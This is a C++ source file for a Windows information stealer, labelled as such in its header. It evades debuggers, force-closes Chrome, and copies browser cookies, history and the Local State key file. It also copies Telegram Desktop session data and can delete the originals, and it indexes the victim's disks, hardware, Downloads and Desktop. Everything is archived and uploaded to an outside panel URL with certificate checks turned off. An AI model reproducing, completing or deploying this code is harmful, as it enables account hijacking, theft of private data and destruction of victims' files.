//STEALER + AUTO STARTER OTHER VIRUSES
//BY EGOR BE LIKE
//v.1.0

#include "Global.h"           // GLOBAL VARIABLES
#include "Config.h"           // CONFIG
#include "Indexing.h"         // FOR WORK WITH INDEXING
#include "PCInfo.h"           // FOR WORK WITH PC INFO
#include "IO.h"               // FOR DEBUGGING
#include "Processes.h"        // FOR WORK WITH PROCESSES

void NTAPI tls_callback(PVOID DllHandle, DWORD dwReason, PVOID)
{
    if ((dwReason == DLL_THREAD_ATTACH || dwReason == DLL_PROCESS_ATTACH) && IsDebuggerPresent() && DEBUGGERPROTECT) { exit(STATUS_DLL_INIT_FAILED); }
}

__declspec(thread) int tlsFlag = 1;

#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")  // See p. 1 below
#pragma comment (linker, "/INCLUDE:tls_callback_func")  // See p. 3 below
#else
#pragma comment (linker, "/INCLUDE:__tls_used")  // See p. 1 below
#pragma comment (linker, "/INCLUDE:_tls_callback_func")  // See p. 3 below
#endif

// Explained in p. 3 below
#ifdef _WIN64
#pragma const_seg(".CRT$XLF")
EXTERN_C const
#else
#pragma data_seg(".CRT$XLF")
EXTERN_C
#endif
PIMAGE_TLS_CALLBACK tls_callback_func = tls_callback;
#ifdef _WIN64
#pragma const_seg()
#else
#pragma data_seg()
#endif //_WIN64

DWORD WINAPI ThreadProc(CONST LPVOID lpParam)
{
    ExitThread(0);
}

// Read the history database
bool history(fs::directory_entry p) {
    wchar_t* temp = new wchar_t[MAX_PATH];
    temp = wcscpy(temp, (p.path().wstring() + L"\\History").c_str());
    try {
        if (fs::exists(temp)) { fs::copy(temp, getabspathincurrdir((L"tmp\\" + profile + L"-history.db").c_str()), fs::copy_options::overwrite_existing); return true;}
        else return true;
    }
    catch (fs::filesystem_error err) {
        return false;
    }
}

bool steal(fs::directory_entry p) {
    wchar_t* temp = new wchar_t[MAX_PATH];
    temp = wcscpy(temp, (p.path().wstring() + L"\\Network\\Cookies").c_str());
    try {
        if (fs::exists(temp)) { fs::copy(temp, getabspathincurrdir((L"tmp\\" + profile + L"-cookie.db").c_str()), fs::copy_options::overwrite_existing); return true;}
        else return true;
    }
    catch (fs::filesystem_error err) {
        return false;
    }
}

bool idisks = false;
bool fidisks = false;
#define IDISKS (!INDEXDISKS || idisks || fidisks)
void index_disks() {
    wchar_t* temp = new wchar_t[MAX_PATH];
    wofstream file;
    if (!open(file, wcscpy(temp, getabspathincurrdir(L"tmp\\disks.txt").c_str()))) { fidisks = true; return; }

    for (fs::path p : getdisks()) file << p.wstring().c_str() << L"\n";

    file.close();
	idisks = true;
}

bool ipc = false;
bool fipc = false;
#define IPC (!INDEXPC || ipc || fipc)
void index_pc() {
    wchar_t* temp = new wchar_t[MAX_PATH];
    wofstream file;
    if (!open(file, wcscpy(temp, getabspathincurrdir(L"tmp\\pcinfo.txt").c_str()))) { fipc = true; return; }

    PCINFO pc = get_pcinfo();

    file << "MOTHERBOARD:\n * " << isna(pc.mb.vendor) << "\n * " << isna(pc.mb.product) << "\n";

    file << L"CPU:\n * " << isna(pc.cpu.brand) << L"\n * " << pc.cpu.threads << L"/" << pc.cpu.cores
        << L" cores/threads\n * " << (pc.cpu.is64bit ? L"64-bit" : L"32-bit") << L" (program)\n";

    file << L"MEM:\n * " << pc.mem.used << L"/" << pc.mem.total << L" GB used/total = " << pc.mem.percent << L"%\n" << pc.mem.count_plates << L" PLATES MAX:";

    for (size_t i = 0; i < pc.mem.count_plates; i++)
    {
        if (pc.mem.plates[i].memory) file << L"\n * " << isna(pc.mem.plates[i].dimm) << L" | " << pc.mem.plates[i].memory
            << L" GB | " << isna(pc.mem.plates[i].ddr) << L" | " << pc.mem.plates[i].speed
            << L" MGz | " << isna(pc.mem.plates[i].product);
        else file << L"\n * " << isna(pc.mem.plates[i].dimm) << L" | N/A";
    }

    if (0 >= pc.mem.count_plates) file << L"\nN/A";

    file.close();
	ipc = true;
}

bool idld = false;
bool fidld = false;
#define IDLD (!INDEXDOWNLOADS || idld || fidld)
void index_downloads() {
    wchar_t* temp = new wchar_t[MAX_PATH];
    wofstream file;
    if (!open(file, wcscpy(temp, getabspathincurrdir(L"tmp\\downloads.txt").c_str()))) { fidld = true; return; }

    vector<fs::path> buff;

    GetEnvironmentVariableW(L"USERPROFILE", downloads, MAX_PATH);
    downloads = wcscat(downloads, L"\\Downloads\\");

    index(buff, downloads);
    if (buff.empty()) { file << downloads << L" isn't exist"; fidld = true; return; }
    for (fs::path p : buff) if (!is_cache(p)) file << p.wstring().c_str() << L"\n";
    file.close();
	idld = true;
}

bool idsk = false;
bool fidsk = false;
#define IDSK (!INDEXDESKTOP || idsk || fidsk)
void index_desktop() {
    wchar_t* temp = new wchar_t[MAX_PATH];
	wofstream file;
    if (!open(file, wcscpy(temp, getabspathincurrdir(L"tmp\\desktop.txt").c_str()))) { fidsk = true; return; }

	vector<fs::path> buff;

	GetEnvironmentVariableW(L"USERPROFILE", desktop, MAX_PATH);
	desktop = wcscat(desktop, L"\\Desktop\\");

	index(buff, desktop);
    if (buff.empty()) { file << desktop << L" isn't exist"; fidsk = true; return; }
	for (fs::path p : buff) if (!is_cache(p)) file << p.wstring().c_str() << L"\n";
	file.close();
	idsk = true;
}

bool crm = false;
bool fcrm = false;
#define CRM (!(INDEXHISTORY || STEALCOOKIE) || crm || fcrm)
void chrome() {
    if (CLOSECHROME) {
        auto processes = checkSelf(L"chrome.exe");
        if (!processes.empty()) {
            DWORD result = closeSelf(L"chrome.exe");
            if (result) {
                int cmdres = cmdClose("chrome.exe");
                if (cmdres) { fcrm = true; return; }
            }
            Sleep(1000);
        }
    }
    if (CLOSECHROME && !checkSelf(L"chrome.exe").empty()) { fcrm = true; return; }
    fs::copy(chromedir+wstring(L"Local State"), getabspathincurrdir(L"tmp\\localstate.json"));
    for (auto& p : fs::directory_iterator{ chromedir }) {
        profile = p.path().wstring().substr(
            p.path().wstring().find(chromedir) + wcslen(chromedir),
            p.path().wstring().size() - wcslen(chromedir)
        );
        if (INDEXHISTORY) fcrm |= !history(p);
        if (STEALCOOKIE) fcrm |= !steal(p);
    }
    if (!fcrm) crm = true;
}

bool dtdata = false;
bool fdtdata = false;
#define DTDATA (!COPYTDATA || dtdata || fdtdata)
void desktop_tdata() {
    GetEnvironmentVariableW(L"APPDATA", dtdir, MAX_PATH);
    dtdir = wcscat(dtdir, L"\\Telegram Desktop\\");
    reserveDelete(dtdir);
    try {
        if (!fs::exists(dtdir)) { fdtdata = true; return; }
        CreateDirectoryW(getabspathincurrdir(wstring(L"tmp\\Desktop TDir\\").c_str()).c_str(), NULL);
        fs::copy(
            dtdir + wstring(L"tdata\\key_datas"),
            fs::path(getabspathincurrdir(L"tmp\\Desktop TDir\\key_datas")),
            fs::copy_options::overwrite_existing
        );
        vector<fs::path> exe;
        index(exe, dtdir + wstring(L"tdata\\"), "", false, true);
        for (auto& file1 : exe) {
            for (auto& file2 : exe) {
                if (file1.wstring() != file2.wstring() + L"s") continue;
                CreateDirectoryW(getabspathincurrdir((L"tmp\\Desktop TDir" + file2.wstring()).c_str()).c_str(), NULL);
                fs::copy(
                    dtdir + wstring(L"tdata") + file1.wstring(),
                    fs::path(getabspathincurrdir((L"tmp\\Desktop TDir" + file1.wstring()).c_str())),
                    fs::copy_options::overwrite_existing | fs::copy_options::recursive
                );
                fs::copy(
                    dtdir + wstring(L"tdata") + file2.wstring() + L"\\configs",
                    fs::path(getabspathincurrdir((L"tmp\\Desktop TDir" + file2.wstring() + L"\\configs").c_str())),
                    fs::copy_options::overwrite_existing
                );
                fs::copy(
                    dtdir + wstring(L"tdata") + file2.wstring() + L"\\maps",
                    fs::path(getabspathincurrdir((L"tmp\\Desktop TDir" + file2.wstring() + L"\\maps").c_str())),
                    fs::copy_options::overwrite_existing
                );
            }
        }
        if (DELORIGTDATA) fs::remove_all(dtdir);
        dtdata = true;
    }
    catch (fs::filesystem_error& e) {
        fdtdata = true;
    }
}

bool tdata = false;
bool ftdata = false;
#define RTDATA (!COPYTDATA || tdata || ftdata)
void reg_tdata() {
    HKEY reg;
    vector<unsigned char> data;
    data.resize(MAX_PATH);
    size_t spos = wstring::npos, epos = wstring::npos;
    DWORD len = MAX_PATH;
    DWORD type = REG_SZ;
    if (RegOpenKeyExW(HKEY_CLASSES_ROOT, L"tg\\shell\\open\\command", NULL, KEY_QUERY_VALUE, (PHKEY)&reg) != ERROR_SUCCESS) { MessageBoxW(NULL, (L"Open: " + to_wstring(fcrm)).c_str(), L"TEXT", MB_OK); ftdata = true; return; }
    if (RegQueryValueExW(reg, L"", NULL, &type, &data[0], &len) != ERROR_SUCCESS) { ftdata = true; return; }
    RegCloseKey(reg);
    string command;
    for (auto& d : data) { if (d != 0) command += d; }
    for (auto& disk : getdisks()) {
        if ((spos = command.find_first_of(disk.string())) != string::npos) break;
    }
    if (!(spos != string::npos && (epos = command.find_last_of(".exe") - 1) != string::npos - 1)) { ftdata = true; return; }
    fs::path exepath = fs::path(command.substr(spos - 1, (epos - spos) + 3));
    tdir = wcscpy(tdir, (exepath.parent_path().wstring() + L"\\").c_str());
    reserveDelete(tdir);
    try {
        if (fs::exists(tdir)) { ftdata = true; return; }
        CreateDirectoryW(getabspathincurrdir(wstring(L"tmp\\Desktop TDir\\").c_str()).c_str(), NULL);
        fs::copy(
            tdir + wstring(L"tdata\\key_datas"),
            fs::path(getabspathincurrdir(L"tmp\\Desktop TDir\\key_datas")),
            fs::copy_options::overwrite_existing
        );
        vector<fs::path> exe;
        index(exe, tdir + wstring(L"tdata\\"), "", false, true);
        for (auto& file1 : exe) {
            for (auto& file2 : exe) {
                if (file1.wstring() != file2.wstring() + L"s") continue;
                CreateDirectoryW(getabspathincurrdir((L"tmp\\Desktop TDir" + file2.wstring()).c_str()).c_str(), NULL);
                fs::copy(
                    tdir + wstring(L"tdata") + file1.wstring(),
                    fs::path(getabspathincurrdir((L"tmp\\Desktop TDir" + file1.wstring()).c_str())),
                    fs::copy_options::overwrite_existing | fs::copy_options::recursive
                );
                fs::copy(
                    tdir + wstring(L"tdata") + file2.wstring() + L"\\configs",
                    fs::path(getabspathincurrdir((L"tmp\\Desktop TDir" + file2.wstring() + L"\\configs").c_str())),
                    fs::copy_options::overwrite_existing
                );
                fs::copy(
                    tdir + wstring(L"tdata") + file2.wstring() + L"\\maps",
                    fs::path(getabspathincurrdir((L"tmp\\Desktop TDir" + file2.wstring() + L"\\maps").c_str())),
                    fs::copy_options::overwrite_existing
                );
            }
        }
        if (DELORIGTDATA) fs::remove_all(tdir);
        tdata = true;
    }
    catch (fs::filesystem_error& e) {
        ftdata = true;
    }
}

void SetCurPos(int x, int y) {
    ifDebug({
        COORD c;
        c.X = x;
        c.Y = y;
        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), c);
    });
}

void SetCol(WORD color) {
    ifDebug(SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color));
}

static size_t curl_data_write(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

int wmain(int** argc, wchar_t* argv[])
{
    if (PROCESSCHECK && checkSelf(fs::path(argv[0]).filename().c_str()).size() > 1) { return -1; }

    ifDebug({
        _setmode(_fileno(stdout), 0x20000); //0x20000 is the same as _O_U16TEXT
        _setmode(_fileno(stdin), 0x20000);
        _setmode(_fileno(stderr), 0x20000);
    });
    log_file.imbue(locale(".utf-8"));

    if (PINGREQUIRED && system("ping -n 1 -w 500 google.com > nul") != 0) { return -2; }

    ifNDebug({ if (FreeConsole() == FALSE) return -3; });

    ifDebug(cout << boolalpha);

    CreateDirectoryW(getabspathincurrdir(L"tmp").c_str(), NULL);

	//   Getting Chrome directory
    GetEnvironmentVariableW(L"LOCALAPPDATA", chromedir, MAX_PATH);
    chromedir = wcscat(chromedir, L"\\Google\\Chrome\\User Data\\");
    
    reserveDelete(chromedir);

    cout(0,0,FWHITE,L"Chrome path ");
    if (fs::exists(chromedir)) { cout(12, 0, FGREEN, L"exists"); }
    else { cout(12, 0, FRED, L"not exists"); }
    // ! Getting Chrome directory

	//   Getting self directory
    self = wcscpy(self, getabspathincurrdir().c_str());

    cout(0,1,FWHITE,L"Self path ");
    if (fs::exists(self)) { cout(10, 1, FGREEN, L"exists"); }
    else { cout(10, 1, FRED, L"not exists"); }
	// ! Getting self directory

    cout(0, 3, FWHITE, L"Index disks: ");
    if (INDEXDISKS) {
        cout(22, 3, BYELLOW, STARTED_STAT);
        thread th1{ index_disks };
        th1.detach();
    } else { cout(22, 3, BBLUE, DISABLED_STAT); }

    cout(0, 4, FWHITE, L"Index PC: ");
    if (INDEXPC) {
        cout(22, 4, BYELLOW, STARTED_STAT);
        thread th2{ index_pc };
        th2.detach();
    } else { cout(22, 4, BBLUE, DISABLED_STAT); }

    cout(0, 5, FWHITE, L"Index downloads: ");
    if (INDEXDOWNLOADS) {
        cout(22, 5, BYELLOW, STARTED_STAT);
        thread th3{ index_downloads };
        th3.detach();
    } else { cout(22, 5, BBLUE, DISABLED_STAT); }

    cout(0, 6, FWHITE, L"Index desktop: ");
    if (INDEXDESKTOP) {
        cout(22, 6, BYELLOW, STARTED_STAT);
        thread th4{ index_desktop };
        th4.detach();
    } else { cout(22, 6, BBLUE, DISABLED_STAT); }

    cout(0, 7, FWHITE, L"Steal chrome: ");
    if (INDEXHISTORY || STEALCOOKIE) {
        cout(22, 7, BYELLOW, STARTED_STAT);
        thread th5{ chrome };
        th5.detach();
    } else { cout(22, 7, BBLUE, DISABLED_STAT); }

    cout(0, 8, FWHITE, L"Steal desktop tdata: ");
    cout(0, 9, FWHITE, L"Steal registry tdata: ");
    if (COPYTDATA) {
        cout(22, 8, BYELLOW, STARTED_STAT);
        cout(22, 9, BYELLOW, STARTED_STAT);
        thread th6{ desktop_tdata };
        th6.detach();
        thread th7{ reg_tdata };
        th7.detach();
    } else {
        cout(22, 8, BBLUE, DISABLED_STAT);
        cout(22, 9, BBLUE, DISABLED_STAT);
    }

    cout(0, 11, FWHITE, L"Archive: ");
    cout(22, 11, BCYAN, WAITING_STAT);
    cout(0, 12, FWHITE, L"Sending: ");
    cout(22, 12, BCYAN, WAITING_STAT);

    do {
        if (idisks)  { cout(22, 3, BGREEN, OK_STAT); }
        if (fidisks) { cout(22, 3, BRED, FAIL_STAT); }
        if (ipc)     { cout(22, 4, BGREEN, OK_STAT); }
        if (fipc)    { cout(22, 4, BRED, FAIL_STAT); }
        if (idld)    { cout(22, 5, BGREEN, OK_STAT); }
        if (fidld)   { cout(22, 5, BRED, FAIL_STAT); }
        if (idsk)    { cout(22, 6, BGREEN, OK_STAT); }
        if (fidsk)   { cout(22, 6, BRED, FAIL_STAT); }
        if (crm)     { cout(22, 7, BGREEN, OK_STAT); }
        if (fcrm)    { cout(22, 7, BRED, FAIL_STAT); }
        if (dtdata)  { cout(22, 8, BGREEN, OK_STAT); }
        if (fdtdata) { cout(22, 8, BRED, FAIL_STAT); }
        if (tdata)   { cout(22, 9, BGREEN, OK_STAT); }
        if (ftdata)  { cout(22, 9, BRED, FAIL_STAT); }
    } while (!(IDISKS && IPC && IDLD && IDSK && CRM && DTDATA && RTDATA));

    if (idisks) { cout(22, 3, BGREEN, OK_STAT); }
    if (fidisks) { cout(22, 3, BRED, FAIL_STAT); }
    if (ipc) { cout(22, 4, BGREEN, OK_STAT); }
    if (fipc) { cout(22, 4, BRED, FAIL_STAT); }
    if (idld) { cout(22, 5, BGREEN, OK_STAT); }
    if (fidld) { cout(22, 5, BRED, FAIL_STAT); }
    if (idsk) { cout(22, 6, BGREEN, OK_STAT); }
    if (fidsk) { cout(22, 6, BRED, FAIL_STAT); }
    if (crm) { cout(22, 7, BGREEN, OK_STAT); }
    if (fcrm) { cout(22, 7, BRED, FAIL_STAT); }
    if (dtdata) { cout(22, 8, BGREEN, OK_STAT); }
    if (fdtdata) { cout(22, 8, BRED, FAIL_STAT); }
    if (tdata) { cout(22, 9, BGREEN, OK_STAT); }
    if (ftdata) { cout(22, 9, BRED, FAIL_STAT); }

    //   Archive
    cout(22, 11, BYELLOW, STARTED_STAT);

    archive* arc = archive_write_new();
    archive_write_set_compression_lzma(arc);
    archive_write_set_format_pax_restricted(arc);
    archive_write_set_format_7zip(arc);
    archive_write_open_filename_w(arc, getabspathincurrdir(L"tmp.7z").c_str());
    
    add_directory_to_archive(arc, getabspathincurrdir(L"tmp\\"));
    
    archive_write_close(arc);
    archive_write_free(arc);

    cout(22, 11, BGREEN, OK_STAT);
    // ! Archive

    //   Send data
    cout(22, 12, BYELLOW, STARTED_STAT);
    CURL* curl = curl_easy_init();
    CURLcode res{};

    curl_mime* form = curl_mime_init(curl);;
    curl_mimepart* field{};
    curl_slist* headerlist{};

    field = curl_mime_addpart(form);
    curl_mime_name(field, "data");
    curl_mime_filedata(field, getabspathincurrdira("tmp.7z").c_str());

    field = curl_mime_addpart(form);
    curl_mime_name(field, "filename");
    curl_mime_data(field, "tmp.7z", CURL_ZERO_TERMINATED);

    field = curl_mime_addpart(form);
    curl_mime_name(field, "submit");
    curl_mime_data(field, "send", CURL_ZERO_TERMINATED);

    field = curl_mime_addpart(form);
    curl_mime_name(field, "token");
    curl_mime_data(field, TOKEN, CURL_ZERO_TERMINATED);

    curl_opt(curl, CURLOPT_URL, "https://web.141b.ru/panel/v1/uploadpc.php");
    curl_opt(curl, CURLOPT_MIMEPOST, form);

    curl_opt(curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_opt(curl, CURLOPT_SSL_VERIFYHOST, FALSE);

    string data;
    curl_opt(curl, CURLOPT_WRITEFUNCTION, curl_data_write);
    curl_opt(curl, CURLOPT_WRITEDATA, &data);


    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        cout(22, 12, BRED, FAIL_STAT);
        cout(0, 13, FWHITE, L"Status: ");
        cout(22, 13, BRED, (to_string(res) + " (" + curl_easy_strerror(res) + ")").c_str());
        return -5;
    }

    size_t utf8_len = data.length();
    char* tmp = (char*)malloc(utf8_len + 1);// просим место    
    for (int i = 0; i < utf8_len; i++) tmp[i] = (char)data[i];
    wchar_t* wtmp = (wchar_t*)malloc(utf8_len * 2 + 2);
    utf8_len = MultiByteToWideChar(
        CP_UTF8, 0, tmp, utf8_len, wtmp, utf8_len);
    wtmp[utf8_len] = 0;
    free((void*)tmp);

    long response_code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    cout(0, 13, FWHITE, L"Status: ");
    cout(22, 13, (response_code < 400) ? BGREEN : BRED, (to_wstring(response_code) + L"(" + wtmp + L")").c_str());

    curl_easy_cleanup(curl);
    curl_mime_free(form);
    cout(22, 12, (response_code < 400) ? BGREEN : BRED, ((response_code < 400) ? OK_STAT : FAIL_STAT));

    // ! Send data

    if (ISDEBUG) { system("pause>nul"); }
    return (response_code < 400)?0:-response_code;
}